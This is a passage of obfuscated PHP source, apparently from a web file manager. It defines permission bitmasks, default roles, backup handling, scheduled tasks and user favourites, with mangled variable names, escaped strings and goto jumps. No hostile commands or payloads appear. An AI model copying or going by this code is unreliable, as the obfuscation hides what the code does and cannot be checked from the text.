4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ÎºÄ‘ÍÓ =& $_SERVER[­á Ş³Ö]; $ŸôË—ù = array(array($ÎºÄ‘ÍÓ[420] => LNG($ÎºÄ‘ÍÓ[1853]), $ÎºÄ‘ÍÓ[1854] => $ÎºÄ‘ÍÓ[1855], $ÎºÄ‘ÍÓ[1856] => 1, $ÎºÄ‘ÍÓ[1857] => 1, $ÎºÄ‘ÍÓ[1858] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÎºÄ‘ÍÓ[420] => LNG($ÎºÄ‘ÍÓ[1859]), $ÎºÄ‘ÍÓ[1854] => $ÎºÄ‘ÍÓ[1860], $ÎºÄ‘ÍÓ[1856] => 2, $ÎºÄ‘ÍÓ[1857] => 1, $ÎºÄ‘ÍÓ[1858] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÎºÄ‘ÍÓ[420] => LNG($ÎºÄ‘ÍÓ[1861]), $ÎºÄ‘ÍÓ[1854] => $ÎºÄ‘ÍÓ[1862], $ÎºÄ‘ÍÓ[1856] => 3, $ÎºÄ‘ÍÓ[1857] => 1, $ÎºÄ‘ÍÓ[1858] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÎºÄ‘ÍÓ[420] => LNG($ÎºÄ‘ÍÓ[1863]), $ÎºÄ‘ÍÓ[1854] => $ÎºÄ‘ÍÓ[1864], $ÎºÄ‘ÍÓ[1856] => 4, $ÎºÄ‘ÍÓ[1857] => 1, $ÎºÄ‘ÍÓ[1858] => self::AUTH_SHOW | self::AUTH_VIEW), array($ÎºÄ‘ÍÓ[420] => LNG($ÎºÄ‘ÍÓ[1865]), $ÎºÄ‘ÍÓ[1854] => $ÎºÄ‘ÍÓ[1866], $ÎºÄ‘ÍÓ[1856] => 5, $ÎºÄ‘ÍÓ[1857] => 1, $ÎºÄ‘ÍÓ[1858] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ÎºÄ‘ÍÓ[420] => LNG($ÎºÄ‘ÍÓ[1867]), $ÎºÄ‘ÍÓ[1854] => $ÎºÄ‘ÍÓ[1868], $ÎºÄ‘ÍÓ[1856] => 6, $ÎºÄ‘ÍÓ[1857] => 1, $ÎºÄ‘ÍÓ[1858] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ÎºÄ‘ÍÓ[420] => LNG($ÎºÄ‘ÍÓ[1869]), $ÎºÄ‘ÍÓ[1854] => $ÎºÄ‘ÍÓ[1870], $ÎºÄ‘ÍÓ[1856] => 7, $ÎºÄ‘ÍÓ[1857] => 1, $ÎºÄ‘ÍÓ[1858] => 0)); return $ŸôË—ù; } public static function authCheck($·ÂÉŒì°, $Ú½Ëı®å) { $ÅÏá€™£ =& $_SERVER[­á Ş³Ö]; $·ÂÉŒì° = intval($·ÂÉŒì°); if ($GLOBALS[$ÅÏá€™£[494]] && $GLOBALS[$ÅÏá€™£[6]][$ÅÏá€™£[1871]]) { return !0; } if ($·ÂÉŒì° <= 0) { return !1; } if (($·ÂÉŒì° & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($·ÂÉŒì° & $Ú½Ëı®å); } public static function authCheckShow($ôÛ•Û‡) { return self::authCheck($ôÛ•Û‡, self::AUTH_SHOW); } public static function authCheckView($ãñŒ•½) { return self::authCheck($ãñŒ•½, self::AUTH_VIEW); } public static function authCheckDownload($çøĞ¡­†) { return self::authCheck($çøĞ¡­†, self::AUTH_DOWNLOAD); } public static function authCheckUpload($²êƒ²éø) { return self::authCheck($²êƒ²éø, self::AUTH_UPLOAD); } public static function authCheckEdit($ˆ›Úóãä) { return self::authCheck($ˆ›Úóãä, self::AUTH_EDIT); } public static function authCheckRemove($ê…æ²) { return self::authCheck($ê…æ², self::AUTH_REMOVE); } public static function authCheckShare($±—ßö¼Î) { return self::authCheck($±—ßö¼Î, self::AUTH_SHARE); } public static function authCheckComment($Ìëîâš) { return self::authCheck($Ìëîâš, self::AUTH_COMMENT); } public static function authCheckEvent($í¢‹¡úŒ) { return self::authCheck($í¢‹¡úŒ, self::AUTH_EVENT); } public static function authCheckRoot($Ëƒ½ÈˆŸ) { return self::authCheck($Ëƒ½ÈˆŸ, self::AUTH_ROOT); } public static function authCheckAction($¿Ø€Ï‡, $ùç‡õò) { $›‡²ëºª =& $_SERVER[­á Ş³Ö]; $óİæıÈ¯ = array($›‡²ëºª[1872] => self::AUTH_VIEW, $›‡²ëºª[1190] => self::AUTH_DOWNLOAD, $›‡²ëºª[107] => self::AUTH_UPLOAD, $›‡²ëºª[1822] => self::AUTH_EDIT, $›‡²ëºª[1821] => self::AUTH_REMOVE, $›‡²ëºª[1832] => self::AUTH_SHARE, $›‡²ëºª[354] => self::AUTH_COMMENT, $›‡²ëºª[1651] => self::AUTH_EVENT, $›‡²ëºª[1873] => self::AUTH_ROOT); if (!isset($óİæıÈ¯[$ùç‡õò])) { return; } $ä·«îç— = $óİæıÈ¯[$ùç‡õò]; $¿Ø€Ï‡ = intval($¿Ø€Ï‡); if ($¿Ø€Ï‡ <= 0) { return !1; } if (($¿Ø€Ï‡ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¿Ø€Ï‡ & $ä·«îç—); } public static function authDisable($ÇúÜ‡±, $’©êì¢º) { if (intval($ÇúÜ‡±) <= 0) { return 0; } return intval($ÇúÜ‡±) & ~$’©êì¢º; } public $optionType = "\123\171\163\x74\145\x6d\x2e\x73\x6f\165\162\143\145\101\165\164\x68\114\x69\163\164"; public $field = array("\156\x61\x6d\145", "\x61\165\164\150", "\154\x61\142\x65\x6c", "\144\x69\163\160\x6c\x61\171", "\x73\171\x73\x74\145\x6d", "\163\x6f\162\x74"); public function initData() { $şŸÅ§Öä = $this->authDefault(); foreach ($şŸÅ§Öä as $ñªäÑÙ) { $this->add($ñªäÑÙ); } } public function findAuth($˜Ñ»‹ßö, $çİñ¾Âä) { $«µÛğ°ë =& $_SERVER[­á Ş³Ö]; $øæ¢æãù = parent::listData(); foreach ($øæ¢æãù as $Õ³¥ƒÀË) { $Ëë†ïµÈ = intval($Õ³¥ƒÀË[$«µÛğ°ë[413]]); if ($Ëë†ïµÈ <= 0 || $Õ³¥ƒÀË[$«µÛğ°ë[1874]] == 0) { continue; } if (($Ëë†ïµÈ & $˜Ñ»‹ßö) != $˜Ñ»‹ßö) { continue; } if (($Ëë†ïµÈ & $çİñ¾Âä) != 0) { continue; } return $Õ³¥ƒÀË[$«µÛğ°ë[399]]; } return !1; } public function findAuthReadOnly() { $äş¡ÉÇ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ûòŸåÚ“ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($äş¡ÉÇ, $ûòŸåÚ“); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $èñæê¾ş =& $_SERVER[­á Ş³Ö]; $Á™°Ì = parent::listData(); $›ñ½¡±¯ = !1; foreach ($Á™°Ì as $›ÆÂ™ã) { if ($›ÆÂ™ã[$èñæê¾ş[413]] <= 0 || $›ÆÂ™ã[$èñæê¾ş[1874]] == $èñæê¾ş[198]) { continue; } if (!$›ñ½¡±¯) { $›ñ½¡±¯ = $›ÆÂ™ã; continue; } if ($›ñ½¡±¯[$èñæê¾ş[413]] > $›ÆÂ™ã[$èñæê¾ş[413]]) { $›ñ½¡±¯ = $›ÆÂ™ã; } } return $›ñ½¡±¯ ? $›ñ½¡±¯[$èñæê¾ş[399]] : $èñæê¾ş[12]; } public function listData($±ºû‚ÊÜ = false, $ˆ£Ñ¨â¦ = "\x73\157\x72\x74", $´Ø”Èï÷ = false) { return parent::listData($±ºû‚ÊÜ, $ˆ£Ñ¨â¦, $´Ø”Èï÷); } public function update($ÀÊ”Ã—², $Ğá²Åı¿) { $ÏûˆÖ”í =& $_SERVER[­á Ş³Ö]; $Íó½ÁÍÑ = parent::listData($ÀÊ”Ã—²); $¹¬­Ï­¹ = $this->findByName($Ğá²Åı¿[$ÏûˆÖ”í[32]]); if (!$Íó½ÁÍÑ || $¹¬­Ï­¹ && $¹¬­Ï­¹[$ÏûˆÖ”í[399]] != $Íó½ÁÍÑ[$ÏûˆÖ”í[399]]) { return !1; } $this->filterAuth($Ğá²Åı¿[$ÏûˆÖ”í[413]]); return parent::update($ÀÊ”Ã—², $Ğá²Åı¿); } public function remove($ ±¯Óâú) { $¿úôí’¢ = parent::listData($ ±¯Óâú); if (!$¿úôí’¢ || $¿úôí’¢[$_SERVER[­á Ş³Ö][1280]]) { return !1; } return parent::remove($ ±¯Óâú); } public function add($¯æÀË÷… = array()) { $¢œ©¤’š =& $_SERVER[­á Ş³Ö]; if ($this->findByName($¯æÀË÷…[$¢œ©¤’š[32]])) { return !1; } $Æ¾ØÄ¿× = array($¢œ©¤’š[32] => $¢œ©¤’š[12], $¢œ©¤’š[413] => 1, $¢œ©¤’š[1875] => $¢œ©¤’š[1862], $¢œ©¤’š[1874] => 1, $¢œ©¤’š[1280] => 0, $¢œ©¤’š[1876] => 0); $¯æÀË÷… = array_merge($Æ¾ØÄ¿×, $¯æÀË÷…); $¯æÀË÷…[$¢œ©¤’š[1876]] = $this->getSort(); $this->filterAuth($¯æÀË÷…[$¢œ©¤’š[413]]); return parent::insert($¯æÀË÷…); } private function getSort() { $Ã˜ñ­Ù¡ =& $_SERVER[­á Ş³Ö]; $¼ÎñÇ£² = parent::listData(); $ÛÆıˆ¶Ÿ = array_to_keyvalue($¼ÎñÇ£², $Ã˜ñ­Ù¡[12], $Ã˜ñ­Ù¡[1876]); return empty($ÛÆıˆ¶Ÿ) ? 0 : max($ÛÆıˆ¶Ÿ) + 1; } private function filterAuth(&$İ¹€˜úº) { if (!$İ¹€˜úº) { return; } $öÄŸŞ»— = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $—÷Ñ’û = array(); foreach ($öÄŸŞ»— as $›É¥şñÚ) { if ($İ¹€˜úº & $›É¥şñÚ) { $—÷Ñ’û[] = $›É¥şñÚ; } } if (in_array(self::AUTH_ROOT, $—÷Ñ’û)) { $İ¹€˜úº = array_sum($öÄŸŞ»—); return; } $Íâªã„ì = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($—÷Ñ’û as $›É¥şñÚ) { if (isset($Íâªã„ì[$›É¥şñÚ])) { $—÷Ñ’û = array_merge($—÷Ñ’û, $Íâªã„ì[$›É¥şñÚ]); } } $—÷Ñ’û[] = self::AUTH_SHOW; $İ¹€˜úº = array_sum(array_unique($—÷Ñ’û)); } public function sort($–ö·­‚ù, $™Õ¬Å÷Ã) { return parent::update($–ö·­‚ù, $™Õ¬Å÷Ã); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\56\x62\x61\x63\153\x75\160\x4c\x69\x73\164"; public $field = array("\151\x6f", "\x6e\141\x6d\x65", "\163\164\x61\x74\165\x73", "\143\x6f\x6e\164\145\x6e\164", "\155\141\156\165\141\154", "\x72\145\x73\165\154\164", "\164\x69\x6d\145\x46\162\x6f\155", "\x74\x69\155\x65\x54\157"); public function config() { $ù³¾Â°ü =& $_SERVER[­á Ş³Ö]; $µÌÍÔóŒ = Model($ù³¾Â°ü[767])->get($ù³¾Â°ü[777]); $µÌÍÔóŒ = json_decode($µÌÍÔóŒ, !0); $µÌÍÔóŒ = is_array($µÌÍÔóŒ) ? $µÌÍÔóŒ : array(); if (!isset($µÌÍÔóŒ[$ù³¾Â°ü[751]])) { $µÌÍÔóŒ[$ù³¾Â°ü[751]] = $ù³¾Â°ü[88]; } unset($µÌÍÔóŒ[$ù³¾Â°ü[1633]]); Action($ù³¾Â°ü[1877])->taskInit(); Model($ù³¾Â°ü[1632])->cacheClear(); $Ë¬¹ôş = $ù³¾Â°ü[1878]; $´€ş‰´ = Model($ù³¾Â°ü[1879])->findByKey($ù³¾Â°ü[1651], $Ë¬¹ôş); if (!$´€ş‰´) { $´€ş‰´ = array(); } if (isset($´€ş‰´[$ù³¾Â°ü[180]])) { $´€ş‰´[$ù³¾Â°ü[180]] = json_decode($´€ş‰´[$ù³¾Â°ü[180]], !0); } if (isset($µÌÍÔóŒ[$ù³¾Â°ü[180]])) { $´€ş‰´[$ù³¾Â°ü[180]][$ù³¾Â°ü[1636]] = $µÌÍÔóŒ[$ù³¾Â°ü[180]]; unset($µÌÍÔóŒ[$ù³¾Â°ü[180]]); } return array_merge($´€ş‰´, $µÌÍÔóŒ); } public function listData($§†ƒÛò“ = false, $ÈÏË‡ = "\155\157\x64\x69\146\171\124\x69\x6d\x65", $±Í…òĞ¶ = false) { return parent::listData($§†ƒÛò“, $ÈÏË‡, !0); } public function lastItem() { $æ¾ş´œ = $this->listData(); return !empty($æ¾ş´œ[0]) ? $æ¾ş´œ[0] : null; } public function kill($°áÌ·îÅ) { $òªÈš»Í =& $_SERVER[­á Ş³Ö]; $æ½’Üª = $this->listData($°áÌ·îÅ); if (!$æ½’Üª || empty($æ½’Üª[$òªÈš»Í[32]])) { return !0; } Task::kill($òªÈš»Í[776]); Task::kill($òªÈš»Í[797]); Task::kill($òªÈš»Í[806]); $®ÕÀïıÙ = $æ½’Üª[$òªÈš»Í[32]]; $Æ›â²¾ = TEMP_FILES . $òªÈš»Í[775] . $®ÕÀïıÙ . $òªÈš»Í[8]; IO::remove($Æ›â²¾, !1); return $this->remove($°áÌ·îÅ); } public function remove($¸ò¦„à) { $èİ»ÕŒµ = $this->listData($¸ò¦„à); if (!$èİ»ÕŒµ) { return !0; } return $this->backupRemove($èİ»ÕŒµ); } private function backupRemove($¹æÒ€–“) { parent::remove($¹æÒ€–“[$_SERVER[­á Ş³Ö][399]]); $¿éèÄ = $this->backupPath($¹æÒ€–“); IO::remove($¿éèÄ, !1); return !0; } private function backupPath($”úÑè¬ï) { $°ôŒ·¤ =& $_SERVER[­á Ş³Ö]; $´òışšÏ = $”úÑè¬ï[$°ôŒ·¤[32]]; $ÏÚÊ…İÛ = Model($°ôŒ·¤[767])->get($°ôŒ·¤[768]); $ÜáªÓÊÚ = substr(md5($°ôŒ·¤[769] . $ÏÚÊ…İÛ . $´òışšÏ), 0, 8); return "\x7b\x69\157\72{$”úÑè¬ï[$°ôŒ·¤[748]]}\175\57\x64\x61\164\x61\142\x61\163\145\57\x62\x61\143\153\x75\x70\57" . $´òışšÏ . $°ôŒ·¤[11] . $ÜáªÓÊÚ; } public function start() { $Ïõ²¶à÷ =& $_SERVER[­á Ş³Ö]; if ($GLOBALS[$Ïõ²¶à÷[6]][$Ïõ²¶à÷[89]][$Ïõ²¶à÷[1880]] != $Ïõ²¶à÷[88]) { return !0; } $ÜĞİÊáÅ = $this->config(); if (!$ÜĞİÊáÅ || $ÜĞİÊáÅ[$Ïõ²¶à÷[1633]] != $Ïõ²¶à÷[88]) { return !1; } $Üôøßş± = $this->process(); foreach ($Üôøßş± as $Âœøº’) { if ($Âœøº’) { return Task::restart($Âœøº’[$Ïõ²¶à÷[399]]); } } $ğ¦Ää‹¿ = new Backup(); $Õ¦×£ƒ = $ğ¦Ää‹¿->db(); if ($Õ¦×£ƒ) { $Õ¦×£ƒ = $ğ¦Ää‹¿->dbFile(); if ($Õ¦×£ƒ && $ÜĞİÊáÅ[$Ïõ²¶à÷[751]] == $Ïõ²¶à÷[198]) { $Õ¦×£ƒ = $ğ¦Ää‹¿->file(); } } Backup::set(array($Ïõ²¶à÷[746] => 1, $Ïõ²¶à÷[758] => time())); return !0; } public function process() { $¸½ªĞÑÚ =& $_SERVER[­á Ş³Ö]; $ªõÍùè¼ = array($¸½ªĞÑÚ[754] => Task::get($¸½ªĞÑÚ[776]), $¸½ªĞÑÚ[759] => Task::get($¸½ªĞÑÚ[797]), $¸½ªĞÑÚ[200] => Task::get($¸½ªĞÑÚ[806])); $‚§öúƒÈ = !1; foreach ($ªõÍùè¼ as &$¹æÚ§Àç) { if ($‚§öúƒÈ) { $¹æÚ§Àç = !1; continue; } if ($¹æÚ§Àç) { $å¢…‚» = intval(_get($¹æÚ§Àç, $¸½ªĞÑÚ[1668], 0)); if (time() - $å¢…‚» > 7200) { Task::kill($¹æÚ§Àç[$¸½ªĞÑÚ[399]]); $‚§öúƒÈ = !0; $¹æÚ§Àç = !1; } } } return $ªõÍùè¼; } public function restore() { $ÇûÒ–¢Å =& $_SERVER[­á Ş³Ö]; ActionCall($ÇûÒ–¢Å[1056], !0, 1); ActionCall($ÇûÒ–¢Å[1056], !0, 0); } } goto dƒÃàÑ‹¢…; AŒèåÑåõ÷: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\162\157\154\x65\114\151\163\x74"; public $field = array("\x6e\141\x6d\x65", "\141\x75\x74\150", "\154\x61\x62\x65\x6c", "\144\x69\x73\160\154\x61\171", "\x73\x79\x73\164\145\x6d", "\144\x65\x73\x63", "\151\147\156\x6f\162\x65\105\x78\x74", "\x69\147\156\x6f\x72\x65\106\151\154\x65\123\x69\172\145", "\x61\144\x6d\151\x6e\151\x73\164\162\141\x74\x6f\162", "\x73\x6f\x72\164"); public function listData($ÊÀó¾ƒÌ = false, $¹ƒÏ³ŸĞ = "\163\157\x72\x74", $¢ÆˆÈîŞ = false) { $ ÒÊŞ =& $_SERVER[­á Ş³Ö]; $ûÕ©ÅÉ„ = parent::listData($ÊÀó¾ƒÌ, $¹ƒÏ³ŸĞ, $¢ÆˆÈîŞ); if (!$ÊÀó¾ƒÌ) { foreach ($ûÕ©ÅÉ„ as $áŒ”ı†• => $Å¢Ç€œ¯) { if ($Å¢Ç€œ¯[$ ÒÊŞ[2054]] == 1) { $ûÕ©ÅÉ„[$áŒ”ı†•][$ ÒÊŞ[453]] = LNG($ ÒÊŞ[2289]); } } } return $ûÕ©ÅÉ„; } public function update($—Èê¸»», $´«„•ÅÓ) { $öîõØĞ« =& $_SERVER[­á Ş³Ö]; $ĞşïÖ’¬ = parent::listData($—Èê¸»»); $ƒ—Õ÷Éö = $this->findByName($´«„•ÅÓ[$öîõØĞ«[32]]); if (!$ĞşïÖ’¬ || $ƒ—Õ÷Éö && $ƒ—Õ÷Éö[$öîõØĞ«[399]] != $ĞşïÖ’¬[$öîõØĞ«[399]]) { return !1; } if ($ƒ—Õ÷Éö[$öîõØĞ«[2054]] == 1) { $´«„•ÅÓ = array($öîõØĞ«[32] => $´«„•ÅÓ[$öîõØĞ«[32]], $öîõØĞ«[1875] => $´«„•ÅÓ[$öîõØĞ«[1875]]); } $this->filterAuth($´«„•ÅÓ[$öîõØĞ«[413]]); return parent::update($—Èê¸»», $´«„•ÅÓ); } public function remove($¢‡®Ä•û) { $ûñ«¦Ñ = parent::listData($¢‡®Ä•û); if (!$ûñ«¦Ñ || $ûñ«¦Ñ[$_SERVER[­á Ş³Ö][1280]]) { return !1; } return parent::remove($¢‡®Ä•û); } public function add($â¸¸©Ó) { $­äşÄìµ =& $_SERVER[­á Ş³Ö]; $Ë•²ëæÆ = $â¸¸©Ó[$­äşÄìµ[32]]; if ($this->findByName($Ë•²ëæÆ)) { return !1; } $Â¼Î¢ = array($­äşÄìµ[420] => $Ë•²ëæÆ, $­äşÄìµ[1858] => $­äşÄìµ[12], $­äşÄìµ[1854] => $­äşÄìµ[1862], $­äşÄìµ[2290] => 1, $­äşÄìµ[1857] => 0, $­äşÄìµ[2291] => 0, $­äşÄìµ[1856] => $this->getSort()); $â¸¸©Ó = array_merge($Â¼Î¢, $â¸¸©Ó); $this->filterAuth($â¸¸©Ó[$­äşÄìµ[413]]); return parent::insert($â¸¸©Ó); } private function getSort() { $ş˜µÀí­ =& $_SERVER[­á Ş³Ö]; $…ı§Ñ¶´ = parent::listData(); $§Ùªìä = array_to_keyvalue($…ı§Ñ¶´, $ş˜µÀí­[12], $ş˜µÀí­[1876]); return empty($§Ùªìä) ? 0 : max($§Ùªìä) + 1; } private function filterAuth(&$â°ä›šñ) { $êÆè®¦˜ =& $_SERVER[­á Ş³Ö]; $¨ßá´æÉ = array(); $ß¹ª¿ § = array_filter(explode($êÆè®¦˜[50], $â°ä›šñ)); foreach ($ß¹ª¿ § as $â°ä›šñ) { $ô¢ò Ø = explode($êÆè®¦˜[10], $â°ä›šñ); if ($ô¢ò Ø[0] == $êÆè®¦˜[2292] && $ô¢ò Ø[1] != $êÆè®¦˜[1186]) { $ì¿ï×’Š = $ô¢ò Ø[0] . $êÆè®¦˜[10] . $ô¢ò Ø[1] . $êÆè®¦˜[2293]; if (!in_array($ì¿ï×’Š, $ß¹ª¿ §)) { $¨ßá´æÉ[] = $ì¿ï×’Š; } } $¨ßá´æÉ[] = $â°ä›šñ; } $â°ä›šñ = implode($êÆè®¦˜[50], $¨ßá´æÉ); } public function findRoleDefault() { $ÚéñƒÈ =& $_SERVER[­á Ş³Ö]; $ú“²¨Ú» = parent::listData(); $¡ÇçŞô± = !1; foreach ($ú“²¨Ú» as $ ¦¥î“) { if (!$ ¦¥î“ || $ ¦¥î“[$ÚéñƒÈ[1874]] == $ÚéñƒÈ[198] || $ ¦¥î“[$ÚéñƒÈ[2054]] == 1) { continue; } if (strstr($ ¦¥î“[$ÚéñƒÈ[413]], $ÚéñƒÈ[2294])) { continue; } if (!strstr($ ¦¥î“[$ÚéñƒÈ[413]], $ÚéñƒÈ[2295])) { continue; } if (!$¡ÇçŞô±) { $¡ÇçŞô± = $ ¦¥î“; continue; } $Ì‚·ç¸ì = explode($ÚéñƒÈ[50], $¡ÇçŞô±[$ÚéñƒÈ[413]]); $²ƒñ‹ßÙ = explode($ÚéñƒÈ[50], $ ¦¥î“[$ÚéñƒÈ[413]]); if (count($Ì‚·ç¸ì) > count($²ƒñ‹ßÙ)) { $¡ÇçŞô± = $ ¦¥î“; } } return $¡ÇçŞô± ? $¡ÇçŞô±[$ÚéñƒÈ[399]] : $ÚéñƒÈ[12]; } public function sort($¾º¢îĞ÷, $ˆ•²À•æ) { return parent::update($¾º¢îĞ÷, $ˆ•²À•æ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\164\x61\163\153\x4c\x69\163\164"; public $field = array("\x6e\x61\155\x65", "\164\171\160\x65", "\x65\166\x65\156\x74", "\x74\151\155\145", "\x64\x65\x73\143", "\163\x79\163\x74\145\155", "\x65\156\141\x62\154\145", "\154\141\x73\164\122\x75\x6e", "\x73\x6f\x72\x74"); public function listData($Üîº„ÓË = false, $ˆ¾¦‰¬± = "\163\157\162\x74", $á’ğ€Ã® = false) { return parent::listData($Üîº„ÓË, $ˆ¾¦‰¬±, $á’ğ€Ã®); } public function add($¾¨áí™¡) { $¨¡›Ë =& $_SERVER[­á Ş³Ö]; $Ä´¾ê¹ú = $this->findByName($¾¨áí™¡[$¨¡›Ë[32]]); if ($Ä´¾ê¹ú) { return !1; } $¾¨áí™¡[$¨¡›Ë[1623]] = 0; $¾¨áí™¡[$¨¡›Ë[1876]] = $this->getSort(); return parent::insert($¾¨áí™¡); } private function getSort() { $„ÒĞ¯Ä =& $_SERVER[­á Ş³Ö]; $ºøŒïÛî = parent::listData(); $‘Ê‹ÒÛ = array_to_keyvalue($ºøŒïÛî, $„ÒĞ¯Ä[12], $„ÒĞ¯Ä[1876]); return empty($‘Ê‹ÒÛ) ? 0 : max($‘Ê‹ÒÛ) + 1; } public function update($¯…‡èš¶, $ûÓ€Õ€„) { $‡­ı±Ó =& $_SERVER[­á Ş³Ö]; $®·Ÿåµş = $this->listData($¯…‡èš¶); $Õİóû— = $this->findByName($ûÓ€Õ€„[$‡­ı±Ó[32]]); if (!$®·Ÿåµş || $Õİóû— && $Õİóû—[$‡­ı±Ó[399]] != $®·Ÿåµş[$‡­ı±Ó[399]]) { return !1; } return parent::update($¯…‡èš¶, $ûÓ€Õ€„); } public function remove($š¸·ºÀ, $˜ª¢üÊõ = false) { $¼·’Î× =& $_SERVER[­á Ş³Ö]; $Ì¡ÃåäÂ = $this->listData($š¸·ºÀ); if (!$Ì¡ÃåäÂ) { return; } if (!$˜ª¢üÊõ && $Ì¡ÃåäÂ[$¼·’Î×[1280]] == $¼·’Î×[88]) { return !1; } return parent::remove($š¸·ºÀ); } public function enable($¥ú¦ã¼›, $™­£æüƒ) { return $this->update($¥ú¦ã¼›, array($_SERVER[­á Ş³Ö][2284] => $™­£æüƒ)); } public function run($‡½µºê±) { return $this->update($‡½µºê±, array($_SERVER[­á Ş³Ö][2296] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\x66\141\166"; protected function cacheFunctionAlias($œ–äóÄÕ) { $°¶Àå =& $_SERVER[­á Ş³Ö]; return array($°¶Àå[1963] => array(USER_ID, $°¶Àå[2297])); } protected function listData() { $ò­ƒ¬ˆ‡ =& $_SERVER[­á Ş³Ö]; $……»ÓË” = array($ò­ƒ¬ˆ‡[1654] => USER_ID, $ò­ƒ¬ˆ‡[483] => 0); $°æ·äºÍ = $ò­ƒ¬ˆ‡[2298]; $Æ§Èº = $this->field($°æ·äºÍ)->where($……»ÓË”)->order($ò­ƒ¬ˆ‡[2299])->select(); return $Æ§Èº ? $Æ§Èº : array(); } protected function resetCache() { } protected function listView() { $±·óÒè• =& $_SERVER[­á Ş³Ö]; $àçï‘œ = $this->listData(); $œÄİŠ = array_filter_by_field($àçï‘œ, $±·óÒè•[33], $±·óÒè•[416]); $ĞÍ…øıÉ = array_to_keyvalue($œÄİŠ, $±·óÒè•[12], $±·óÒè•[84]); if (!$ĞÍ…øıÉ) { return $àçï‘œ; } $Í•²î±Ü = 2000; $­êÇÏã¿ = array($±·óÒè•[417] => array($±·óÒè•[418], $ĞÍ…øıÉ)); $úôó€¡ = Model($±·óÒè•[822])->listSource($­êÇÏã¿, $Í•²î±Ü); $úôó€¡ = array_merge($úôó€¡[$±·óÒè•[83]], $úôó€¡[$±·óÒè•[82]]); $úôó€¡ = array_to_keyvalue($úôó€¡, $±·óÒè•[402]); foreach ($àçï‘œ as $¦äª‡†“ => $Û¾¦¯íğ) { $ÓÔ¹·¬Â = $úôó€¡[$Û¾¦¯íğ[$±·óÒè•[84]]]; $ÓÔ¹·¬Â = $ÓÔ¹·¬Â ? $ÓÔ¹·¬Â : array(); $àçï‘œ[$¦äª‡†“] = array_merge($ÓÔ¹·¬Â, $Û¾¦¯íğ); } return $àçï‘œ; } protected function addFav($¤†Á¨¤œ, $›”ÍˆÎä = '', $¯ˆ‰çï÷ = "\x73\x6f\165\x72\x63\145") { $÷ë¥ù‘€ =& $_SERVER[­á Ş³Ö]; $Ï˜şª‰» = array($÷ë¥ù‘€[1654] => USER_ID, $÷ë¥ù‘€[483] => 0, $÷ë¥ù‘€[422] => $¯ˆ‰çï÷, $÷ë¥ù‘€[421] => $¤†Á¨¤œ); if ($this->where($Ï˜şª‰»)->find()) { return !1; } $Ï˜şª‰» = array($÷ë¥ù‘€[1654] => USER_ID, $÷ë¥ù‘€[483] => 0); $ÛŸÉÛï¿ = $this->where($Ï˜şª‰»)->max($÷ë¥ù‘€[1876]); if (!$ÛŸÉÛï¿) { $ÛŸÉÛï¿ = 0; } if (!$›”ÍˆÎä && $¯ˆ‰çï÷ == $÷ë¥ù‘€[416]) { $‚ÖÊÚÇœ = Model($÷ë¥ù‘€[1335])->where(array($÷ë¥ù‘€[417] => $¤†Á¨¤œ))->find(); if (!$‚ÖÊÚÇœ) { return !1; } $›”ÍˆÎä = $‚ÖÊÚÇœ[$÷ë¥ù‘€[32]]; } $›”ÍˆÎä = $this->getAutoName($›”ÍˆÎä); $È¿ïäÒö = array($÷ë¥ù‘€[1654] => USER_ID, $÷ë¥ù‘€[483] => 0, $÷ë¥ù‘€[420] => $›”ÍˆÎä, $÷ë¥ù‘€[421] => $¤†Á¨¤œ, $÷ë¥ù‘€[422] => $¯ˆ‰çï÷, $÷ë¥ù‘€[1856] => $ÛŸÉÛï¿ + 1); return $this->add($È¿ïäÒö); } protected function remove($…É»¹ŒÉ) { $•ë‰™­ =& $_SERVER[­á Ş³Ö]; $Óõâ·„Ô = array($•ë‰™­[1654] => USER_ID, $•ë‰™­[419] => $…É»¹ŒÉ); return $this->where($Óõâ·„Ô)->delete(); } protected function removeByName($¢ÃÒ¶öÆ) { $×…°°û» =& $_SERVER[­á Ş³Ö]; 